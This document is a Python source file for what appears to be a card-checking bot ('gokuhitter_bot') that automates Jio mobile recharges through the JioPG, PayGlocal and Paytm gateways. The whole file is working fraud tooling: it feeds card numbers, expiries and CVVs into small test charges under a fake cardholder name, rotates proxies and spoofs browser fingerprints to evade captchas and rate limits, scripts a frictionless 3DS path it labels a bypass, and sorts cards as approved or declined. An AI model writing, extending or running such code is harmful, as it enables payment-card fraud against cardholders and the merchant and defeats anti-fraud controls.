"""
Jio Mobility Recharge Engine (gokuhitter_bot)
─────────────────────────────────────────────
Direct JioPG / PayGlocal flow automation for mobile recharges.
"""

import re
import time
import random
import asyncio
from typing import Dict, Optional, Tuple, Any
from curl_cffi.requests import AsyncSession

PROFILES = [
    {"imp": "chrome131", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "ch": '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"', "plat": '"Windows"', "mob": "?0"},
    {"imp": "chrome124", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/124.0.0.0", "ch": '"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"', "plat": '"macOS"', "mob": "?0"},
    {"imp": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "ch": '"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"', "plat": '"Windows"', "mob": "?0"},
]
SCREENS = [
    {"h": 1080, "w": 1920, "depth": 24},
    {"h": 900, "w": 1440, "depth": 30},
    {"h": 768, "w": 1366, "depth": 24},
]
LANGS = ["en-US,en;q=0.9", "en-IN,en;q=0.9,en-US;q=0.8"]

def _detect_card_brand(num: str) -> Tuple[str, str, str]:
    clean = re.sub(r"\D", "", num)
    if clean.startswith("4"):
        return "visa", "ic_visa", "VISA_CARD"
    elif clean.startswith(("51", "52", "53", "54", "55")) or (clean[:4].isdigit() and 2221 <= int(clean[:4]) <= 2720):
        return "mastercard", "ic_mastercard", "MASTERCARD_CARD"
    elif clean.startswith(("34", "37")):
        return "amex", "ic_amex", "AMEX_CARD"
    elif clean.startswith(("60", "65", "81", "82", "508")):
        return "rupay", "ic_rupay", "RUPAY_CARD"
    return "mastercard", "ic_mastercard", "MASTERCARD_CARD"

class JioHitter:
    MAX_RETRIES = 3

    def __init__(self, phone_number: str, proxy_data: Optional[dict] = None, plan_amount: Optional[float] = None, proxy_pool: Optional[list] = None):
        self.phone = re.sub(r"\D", "", phone_number.strip())
        if len(self.phone) > 10 and self.phone.startswith("91"):
            self.phone = self.phone[2:]
        self.proxy_data = proxy_data
        self.target_amount = plan_amount or 11.0
        # Pool of proxies to rotate through on connection/timeout failures
        self._proxy_pool: list = [p for p in (proxy_pool or []) if p] or ([proxy_data] if proxy_data else [])

    def _get_headers(self, pf, lg, ref, ct=None, origin=None, extra=None):
        h = {
            "Accept-Language": lg,
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Referer": ref,
            "User-Agent": pf["ua"],
            "sec-ch-ua": pf["ch"],
            "sec-ch-ua-mobile": pf["mob"],
            "sec-ch-ua-platform": pf["plat"],
        }
        if ct: h["Content-Type"] = ct
        if origin: h["Origin"] = origin
        if extra: h.update(extra)
        return h

    def _build_proxies(self, proxy_data: Optional[dict]) -> Optional[dict]:
        if not proxy_data:
            return None
        auth = f"{proxy_data['username']}:{proxy_data['password']}@" if "username" in proxy_data else ""
        purl = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
        return {"http": purl, "https": purl}

    async def hit(self, card: dict) -> dict:
        t0 = time.time()

        clean_pan = re.sub(r"\D", "", str(card.get("card", "")))
        clean_mm = str(card.get("month", "01")).zfill(2)
        clean_yy = str(card.get("year", "2030")).strip()
        if len(clean_yy) == 2: clean_yy = f"20{clean_yy}"
        clean_cvv = str(card.get("cvv", "")).strip()

        brand_val, brand_ic, brand_text = _detect_card_brand(clean_pan)

        base_result = {
            "success": False,
            "card": f"{clean_pan}|{clean_mm}|{clean_yy}|{clean_cvv}",
            "amount": f"INR {self.target_amount:.2f}",
            "merchant": "Reliance Jio Infocomm",
            "phone": self.phone,
            "decline_code": None,
            "error": None,
            "status": "UNKNOWN",
            "response_time": 0.0,
            "raw_response": None
        }

        proxy_pool = list(self._proxy_pool) if self._proxy_pool else [None]
        last_result = dict(base_result)

        for attempt in range(self.MAX_RETRIES):
            result = dict(base_result)
            pf = random.choice(PROFILES)
            sc = random.choice(SCREENS)
            lg = random.choice(LANGS)

            # Cycle through pool — dead proxy on attempt 0 → next slot next attempt
            proxy_data = proxy_pool[attempt % len(proxy_pool)] if proxy_pool else None
            proxies = self._build_proxies(proxy_data)

            try:
                async with AsyncSession(impersonate=pf["imp"], proxies=proxies, timeout=10, verify=False) as s:

                    def safe_json(resp):
                        try:
                            return resp.json() or {}
                        except Exception:
                            return {}

                    # 1. Number Lookup
                    r_num = await s.get(
                        f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{self.phone}",
                        headers=self._get_headers(pf, lg, "https://www.jio.com/", extra={"Accept": "application/json, text/plain, */*"})
                    )
                    lookup = safe_json(r_num)
                    if lookup.get("errorMessage") == "CAPTCHA_REQUIRED" or r_num.status_code == 429:
                        result["decline_code"] = "captcha_required"
                        result["error"] = "Jio rate limit / captcha triggered. Try again with proxy."
                        result["response_time"] = round(time.time() - t0, 2)
                        return result

                    if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
                        result["decline_code"] = "invalid_number"
                        result["error"] = f"{self.phone} is not an active Jio subscriber."
                        result["response_time"] = round(time.time() - t0, 2)
                        return result

                    primary = lookup.get("primaryService") or {}
                    billing_type = lookup.get("billingType") or primary.get("billingType") or "PREPAID"
                    next_val = lookup.get("nextPage") or billing_type
                    plans_ref = (
                        f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                        f"?serviceType=mobility&serviceId={self.phone}&next={next_val}&billingType={billing_type}&entrysource=Widget"
                    )

                    # 2. Query Plans
                    r_plans = await s.get(
                        f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{self.phone}",
                        headers=self._get_headers(pf, lg, plans_ref, extra={"Accept": "*/*"})
                    )
                    plans_json = safe_json(r_plans)

                    # Find plan matching target_amount or fallback to cheapest
                    chosen_plan = None
                    all_plans = []
                    for cat in plans_json.get("planCategories") or []:
                        for sub in cat.get("subCategories") or []:
                            for p in sub.get("plans") or []:
                                if p.get("key"):
                                    amt = float(p.get("amount") or 0)
                                    p_entry = {"key": p["key"], "amount": amt, "name": p.get("name") or p.get("planName") or ""}
                                    all_plans.append(p_entry)
                                    if amt == float(self.target_amount):
                                        chosen_plan = p_entry
                                        break
                            if chosen_plan: break
                        if chosen_plan: break

                    if not chosen_plan and all_plans:
                        chosen_plan = min(all_plans, key=lambda x: x["amount"])

                    if not chosen_plan:
                        chosen_plan = {"key": "DATA11", "amount": float(self.target_amount), "name": "11"}

                    plan_key = chosen_plan["key"]
                    result["amount"] = f"INR {chosen_plan['amount']:.2f}"
                    result["plan_name"] = chosen_plan.get("name", "Jio Recharge")

                    # 3. Buy & Pay
                    await s.post(
                        "https://www.jio.com/api/jio-recharge-service/recharge/buy",
                        headers=self._get_headers(pf, lg, plans_ref, ct="application/json", origin="https://www.jio.com"),
                        json={"planKey": plan_key, "selectedService": self.phone}
                    )

                    r_pay = await s.post(
                        "https://www.jio.com/api/jio-recharge-service/recharge/pay",
                        headers=self._get_headers(pf, lg, plans_ref, ct="application/json", origin="https://www.jio.com"),
                        json={"addonPlanKeys": [], "flexiTopupFlow": False, "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": self.phone}]}
                    )
                    payment_url = r_pay.json().get("paymentURL", "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")

                    # 4. Redirect to JioPG
                    r_red = await s.get(
                        payment_url,
                        headers=self._get_headers(pf, lg, plans_ref, extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
                    )
                    fa = re.search(r"action='([^']+)'", r_red.text)
                    fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r_red.text)
                    pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
                    pay_form_data = {k: v for k, v in fi}

                    # 5. Pay Portal Handshake
                    r_portal = await s.post(
                        pay_form_url,
                        headers=self._get_headers(pf, lg, "https://www.jio.com/", ct="application/x-www-form-urlencoded", origin="https://www.jio.com"),
                        data=pay_form_data
                    )
                    pay_jio_ref = str(r_portal.url)

                    # 6. Authorize Card Operation (Fetch x-token)
                    r_auth = await s.post(
                        "https://pay.jio.com/jiopg/v1/authorize-card-operation",
                        headers=self._get_headers(pf, lg, pay_jio_ref, ct="application/json", origin="https://pay.jio.com"),
                        json={"paymentMode": "CCDC", "cardPrefix": clean_pan[:6], "isEMISelected": False, "viewOffer": False, "skuCode": None, "copco": None, "isStoreCreditSelected": None}
                    )
                    x_token = r_auth.json().get("token", "")
                    if not x_token:
                        result["decline_code"] = "auth_token_failed"
                        result["error"] = "JioPG failed to issue authorization x-token for BIN."
                        result["response_time"] = round(time.time() - t0, 2)
                        return result

                    # 7. Card Confirmation (Fetch PayGlocal form)
                    r_ccdc = await s.post(
                        "https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
                        headers=self._get_headers(pf, lg, pay_jio_ref, ct="application/json", origin="https://pay.jio.com", extra={"x-token": x_token}),
                        json={
                            "cvvNumber": clean_cvv,
                            "cashBackApplied": "N",
                            "isTrxnStatusCheckEnable": "N",
                            "seqId": "",
                            "ccRoutePg": "",
                            "customerCardTypeValue": brand_val,
                            "paymentMode": "CCDC",
                            "offerAppliedByCust": False,
                            "viewOffer": False,
                            "cardType": brand_ic,
                            "cardNumber": clean_pan,
                            "cardTypeText": brand_text,
                            "expiryMonth": clean_mm,
                            "expiryYear": clean_yy,
                            "cardHolderName": "Alex Smith",
                            "userCardSaveConsent": False,
                            "browserDetails": {
                                "browserHeader": "application/json",
                                "browserJavaEnabled": False,
                                "browserJavascriptEnabled": True,
                                "browserLanguage": lg.split(",")[0],
                                "browserColorDepth": sc["depth"],
                                "browserScreenHeight": sc["h"],
                                "browserScreenWidth": sc["w"],
                                "browserTz": -330,
                                "browserUserAgent": pf["ua"]
                            }
                        }
                    )
                    ccdc_json = r_ccdc.json() or {}
                    if not ccdc_json.get("status"):
                        result["decline_code"] = "card_confirm_failed"
                        result["error"] = ccdc_json.get("message", "Jio card confirmation failed.")
                        result["response_time"] = round(time.time() - t0, 2)
                        return result

                    html_form = ccdc_json.get("htmlForm", "")
                    ea = re.search(r"action='([^']+)'", html_form)
                    ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
                    eu = ea.group(1) if ea else ""
                    ed = {k: v for k, v in ei}

                    # 8. Bank Connect → Detect Gateway (PayGlocal vs Paytm)
                    r_bank = await s.post(
                        eu,
                        headers=self._get_headers(pf, lg, pay_jio_ref, ct="application/x-www-form-urlencoded", origin="https://pay.jio.com"),
                        data=ed,
                        allow_redirects=True
                    )
                    try:
                        with open(r"C:\Users\acer\.gemini\antigravity\brain\592da348-760c-4914-bcdc-a24a88056638\scratch\bank_last.html", "w", encoding="utf-8") as f_out:
                            f_out.write(f"<!-- URL: {r_bank.url} | STATUS: {r_bank.status_code} -->\n" + r_bank.text)
                    except Exception:
                        pass

                    # ── Check Nexigroup / Frictionless 3DS ACS Bypass ──
                    is_nexigroup = "nexigroup.com" in str(r_bank.url).lower() or "nexigroup" in r_bank.text.lower()
                    cres_m = re.search(r'''name=['"]cres['"]\s+[^>]*value=['"](.*?)['"]''', r_bank.text, re.I | re.S)
                    session_m = re.search(r'''name=['"]threeDSSessionData['"]\s+[^>]*value=['"](.*?)['"]''', r_bank.text, re.I | re.S)
                    cb_m = re.search(r'''<form[^>]+name=['"]vanilla['"][^>]+action=['"](.*?)['"]''', r_bank.text, re.I)
                    if not cb_m:
                        cb_m = re.search(r'''<form[^>]+action=['"](.*?)['"][^>]+name=['"]vanilla['"]''', r_bank.text, re.I)

                    if (is_nexigroup or "vanilla" in r_bank.text.lower()) and cres_m and session_m and cb_m:
                        cres_tok = cres_m.group(1)
                        sess_data = session_m.group(1)
                        cb_url = cb_m.group(1)

                        # POST cres directly back to Paytm instaproxy
                        r_cb = await s.post(
                            cb_url,
                            headers=self._get_headers(pf, lg, str(r_bank.url), ct="application/x-www-form-urlencoded", origin="https://3ds.nexigroup.com"),
                            data={"cres": cres_tok, "threeDSSessionData": sess_data},
                            allow_redirects=True
                        )

                        # Extract Theia transactionStatus form
                        theia_action = re.search(r"action=['\"](https://[^'\"]*transactionStatus[^'\"]*)['\"]", r_cb.text, re.I)
                        theia_fields = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_cb.text, re.I)

                        if theia_action and theia_fields:
                            theia_url = theia_action.group(1)
                            theia_data = {k: v for k, v in theia_fields}

                            r_theia = await s.post(
                                theia_url,
                                headers=self._get_headers(pf, lg, str(r_cb.url), ct="application/x-www-form-urlencoded", origin="https://securepay.paytmpayments.com"),
                                data=theia_data,
                                allow_redirects=True
                            )

                            # Extract B2B Callback Form
                            b2b_action = re.search(r"ACTION=['\"](https://pay\.jio\.com[^'\"]+)['\"]", r_theia.text, re.I)
                            if not b2b_action:
                                b2b_action = re.search(r"action=['\"]([^'\"]*pay\.jio\.com[^'\"]+)['\"]", r_theia.text, re.I)
                            b2b_fields = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_theia.text, re.I)

                            if b2b_action and b2b_fields:
                                b2b_url = b2b_action.group(1)
                                b2b_data = {k: v for k, v in b2b_fields}

                                r_b2b = await s.post(
                                    b2b_url,
                                    headers=self._get_headers(pf, lg, str(r_theia.url), ct="application/x-www-form-urlencoded", origin="https://secure.paytmpayments.com"),
                                    data=b2b_data,
                                    allow_redirects=True
                                )

                                # Extract final paymentservlet form
                                servlet_action = re.search(r"action=['\"](https://www\.jio\.com[^'\"]*paymentservlet[^'\"]*)['\"]", r_b2b.text, re.I)
                                servlet_fields = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_b2b.text, re.I)

                                if servlet_action and servlet_fields:
                                    servlet_url = servlet_action.group(1)
                                    servlet_data = {k: v for k, v in servlet_fields}

                                    r_final = await s.post(
                                        servlet_url,
                                        headers=self._get_headers(pf, lg, str(r_b2b.url), ct="application/x-www-form-urlencoded", origin="https://pay.jio.com",
                                                                  extra={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}),
                                        data=servlet_data,
                                        allow_redirects=True
                                    )

                                    final_text = r_final.text.lower()
                                    result["response_time"] = round(time.time() - t0, 2)

                                    jio_msg = str(servlet_data.get("jioResponseMsg", ""))
                                    msg_parts = jio_msg.split("|")
                                    jio_code = msg_parts[7] if len(msg_parts) > 7 else ""

                                    if jio_code in ("00", "0", "SUCCESS") or "txn_success" in final_text or "payment successful" in final_text:
                                        result["success"] = True
                                        result["status"] = "APPROVED@PAID"
                                        return result
                                    elif jio_code == "05" or "unsuccessful" in final_text:
                                        result["success"] = False
                                        result["status"] = "DECLINED"
                                        result["decline_code"] = "jio_payment_unsuccessful"
                                        result["error"] = "Payment attempt was unsuccessful on Jio Gateway (Code 05)."
                                        return result
                                    elif b2b_data.get("STATUS") == "PENDING" or "pending" in final_text:
                                        result["success"] = False
                                        result["status"] = "PENDING"
                                        result["decline_code"] = "bank_pending"
                                        result["error"] = f"Payment pending bank confirmation ({b2b_data.get('CHARGEAMOUNT', '0.37')} INR hold)."
                                        return result
                                    elif any(term in final_text for term in ["failed", "declined", "error"]):
                                        result["success"] = False
                                        result["decline_code"] = "charge_declined"
                                        result["error"] = "Charge rejected on settlement servlet."
                                        result["status"] = "DECLINED"
                                        return result

                            # If b2b failed or returned status directly from Theia
                            theia_text = r_theia.text.lower()
                            result["response_time"] = round(time.time() - t0, 2)
                            if any(term in theia_text for term in ["successful", "recharge successful"]):
                                result["success"] = True
                                result["status"] = "APPROVED@PAID"
                                return result
                            else:
                                result["decline_code"] = "theia_declined"
                                result["error"] = "Declined after 3DS CRes submission."
                                result["status"] = "DECLINED"
                                return result

                    # ── Check Direct Paytm transactionStatus Form in r_bank ──
                    theia_action_direct = re.search(r"action=['\"](https://[^'\"]*transactionStatus[^'\"]*)['\"]", r_bank.text, re.I)
                    theia_fields_direct = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_bank.text, re.I)

                    if theia_action_direct and theia_fields_direct:
                        theia_url = theia_action_direct.group(1)
                        theia_data = {k: v for k, v in theia_fields_direct}

                        r_theia = await s.post(
                            theia_url,
                            headers=self._get_headers(pf, lg, str(r_bank.url), ct="application/x-www-form-urlencoded", origin="https://securepay.paytmpayments.com"),
                            data=theia_data,
                            allow_redirects=True
                        )

                        # Extract B2B Callback Form
                        b2b_action = re.search(r"ACTION=['\"](https://pay\.jio\.com[^'\"]+)['\"]", r_theia.text, re.I)
                        if not b2b_action:
                            b2b_action = re.search(r"action=['\"]([^'\"]*pay\.jio\.com[^'\"]+)['\"]", r_theia.text, re.I)
                        b2b_fields = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_theia.text, re.I)

                        if b2b_action and b2b_fields:
                            b2b_url = b2b_action.group(1)
                            b2b_data = {k: v for k, v in b2b_fields}

                            r_b2b = await s.post(
                                b2b_url,
                                headers=self._get_headers(pf, lg, str(r_theia.url), ct="application/x-www-form-urlencoded", origin="https://secure.paytmpayments.com"),
                                data=b2b_data,
                                allow_redirects=True
                            )

                            servlet_action = re.search(r"action=['\"](https://www\.jio\.com[^'\"]*paymentservlet[^'\"]*)['\"]", r_b2b.text, re.I)
                            servlet_fields = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_b2b.text, re.I)

                            if servlet_action and servlet_fields:
                                servlet_url = servlet_action.group(1)
                                servlet_data = {k: v for k, v in servlet_fields}

                                r_final = await s.post(
                                    servlet_url,
                                    headers=self._get_headers(pf, lg, str(r_b2b.url), ct="application/x-www-form-urlencoded", origin="https://pay.jio.com",
                                                              extra={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}),
                                    data=servlet_data,
                                    allow_redirects=True
                                )

                                final_text = r_final.text.lower()
                                result["response_time"] = round(time.time() - t0, 2)

                                jio_msg = str(servlet_data.get("jioResponseMsg", ""))
                                msg_parts = jio_msg.split("|")
                                jio_code = msg_parts[7] if len(msg_parts) > 7 else ""

                                if jio_code in ("00", "0", "SUCCESS") or "txn_success" in final_text or "payment successful" in final_text:
                                    result["success"] = True
                                    result["status"] = "APPROVED@PAID"
                                    return result
                                elif jio_code == "05" or "unsuccessful" in final_text:
                                    result["success"] = False
                                    result["status"] = "DECLINED"
                                    result["decline_code"] = "jio_payment_unsuccessful"
                                    result["error"] = "Payment attempt was unsuccessful on Jio Gateway (Code 05)."
                                    return result
                                elif b2b_data.get("STATUS") == "PENDING" or "pending" in final_text:
                                    result["success"] = False
                                    result["status"] = "PENDING"
                                    result["decline_code"] = "bank_pending"
                                    result["error"] = f"Payment pending bank confirmation ({b2b_data.get('CHARGEAMOUNT', '0.37')} INR hold)."
                                    return result
                                elif any(term in final_text for term in ["failed", "declined", "error"]):
                                    result["success"] = False
                                    result["decline_code"] = "charge_declined"
                                    result["error"] = "Charge rejected on settlement servlet."
                                    result["status"] = "DECLINED"
                                    return result

                        theia_text = r_theia.text.lower()
                        result["response_time"] = round(time.time() - t0, 2)
                        if any(term in theia_text for term in ["successful", "recharge successful"]):
                            result["success"] = True
                            result["status"] = "APPROVED@PAID"
                            return result
                        else:
                            result["decline_code"] = "theia_declined"
                            result["error"] = "Declined after direct Paytm settlement."
                            result["status"] = "DECLINED"
                            return result

                    # Check Direct Bank 3DS Challenge
                    bank_url_str = str(r_bank.url).lower()
                    bank_text_lower = r_bank.text.lower()
                    if any(ind in bank_url_str for ind in ["mdpayacs", "acs", "entersekt", "cardinalcommerce", "arcot", "3dsecure", "centinel", "challenge"]) or \
                       any(term in bank_text_lower for term in ["verification code", "verify by phone", "one time password", "enter the verification code", "resend code", "challengeinfo", "secure checkout"]):
                        result["response_time"] = round(time.time() - t0, 2)
                        result["decline_code"] = "3ds_required"
                        phone_hint_m = re.search(r'sent to your phone number\s+([^\s<]+)', r_bank.text, re.I)
                        hint = f" ({phone_hint_m.group(1)})" if phone_hint_m else ""
                        result["error"] = f"3DS OTP Challenge required by issuer{hint}."
                        result["status"] = "3DS_CHALLENGE"
                        return result

                    # Check PayGlocal Gateway Flow
                    m = re.search(r'x-gl-token=([^&\s"\'\\]+)', str(r_bank.url) + r_bank.text)
                    if not m:
                        result["decline_code"] = "pg_token_missing"
                        result["error"] = "Payment gateway token not found in bank redirect."
                        result["response_time"] = round(time.time() - t0, 2)
                        return result

                    gl_token = m.group(1)
                    gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

                    # 9. PayGlocal Init & Paynow
                    await s.get(
                        "https://api.payglocal.com/gl/v2/payments/redirect/dc",
                        params={"x-gl-token": gl_token},
                        headers=self._get_headers(pf, lg, gl_ref, extra={"x-gl-current-host": "api.payglocal.com", "x-gl-gid": "gl_payflow-ui"})
                    )

                    await s.post(
                        "https://api.payglocal.com/gl/v2/payments/pd/paynow",
                        params={"x-gl-token": gl_token},
                        headers=self._get_headers(pf, lg, gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                        json={
                            "isEnc": "false",
                            "payload": {
                                "customerCurrency": "INR",
                                "saveCurrencyPreference": False,
                                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScripEnabled": True, "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"], "timeZone": -330},
                                "billingData": {"addressCountry": "FR"},
                                "shippingData": {},
                                "agreedOnTnCs": True
                            }
                        }
                    )

                    # 10. Risk Fingerprint → KID
                    visitor_id = f"vis_{random.randint(10000000, 99999999)}"
                    r_risk = await s.post(
                        "https://api.payglocal.com/gl/v1/payments/risk/fp",
                        params={"x-gl-token": gl_token},
                        headers=self._get_headers(pf, lg, gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                        json={"requestId": f"{int(time.time()*1000)}.{random.randint(100000,999999)}", "visitorId": visitor_id, "visitorFound": True, "confidenceScore": 1}
                    )
                    kid = (r_risk.json() or {}).get("data", {}).get("kid", "")

                    # 11. Submit Charge (ipay)
                    await asyncio.sleep(random.uniform(0.6, 1.2))
                    r_charge = await s.post(
                        "https://api.payglocal.com/gl/v2/payments/dc/ipay",
                        params={"x-gl-token": gl_token},
                        headers=self._get_headers(pf, lg, gl_ref, ct="application/json", origin="https://api.payglocal.com"),
                        json={
                            "isEnc": "false",
                            "kid": kid,
                            "payload": {
                                "cardNumber": clean_pan,
                                "expiryMonth": clean_mm,
                                "expiryYear": clean_yy,
                                "cvv": clean_cvv,
                                "cardHolderName": "Alex Smith",
                                "saveCard": False,
                                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScriptEnabled": True, "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"], "timeZone": -330, "userAgent": pf["ua"]}
                            }
                        }
                    )
                    pay_resp = r_charge.json() or {}
                    result["raw_response"] = pay_resp
                    result["response_time"] = round(time.time() - t0, 2)

                    status = str(pay_resp.get("status", "")).upper()
                    msg = pay_resp.get("message") or pay_resp.get("reasonCode") or "Charge processed"

                    if status in ("SUCCESS", "APPROVED"):
                        result["success"] = True
                        result["status"] = "APPROVED@PAID"
                        return result
                    elif status in ("REDIRECT", "3DS_REQUIRED") or "redirectUrl" in pay_resp or "html" in str(pay_resp):
                        result["decline_code"] = "3ds_required"
                        result["error"] = "3DS Authentication / OTP required by issuer."
                        result["status"] = "3DS_CHALLENGE"
                        return result
                    else:
                        result["decline_code"] = pay_resp.get("reasonCode") or "card_declined"
                        result["error"] = msg
                        result["status"] = "DECLINED"
                        return result

            except Exception as ex:
                err_str = str(ex)
                result["response_time"] = round(time.time() - t0, 2)
                # If timeout/connection error and we have retries left, rotate proxy and try again
                is_timeout = "timed out" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower() or "curl: (28)" in err_str
                if is_timeout and attempt < self.MAX_RETRIES - 1:
                    last_result = result
                    last_result["error"] = f"Proxy attempt {attempt+1} timed out, retrying..."
                    continue
                result["decline_code"] = "exception"
                result["error"] = err_str[:150]
                result["status"] = "ERROR"
                return result

        # All retries exhausted with timeouts
        last_result["decline_code"] = "proxy_timeout"
        last_result["error"] = f"All {self.MAX_RETRIES} proxy attempts timed out. Load a working proxy."
        last_result["status"] = "ERROR"
        last_result["response_time"] = round(time.time() - t0, 2)
        return last_result
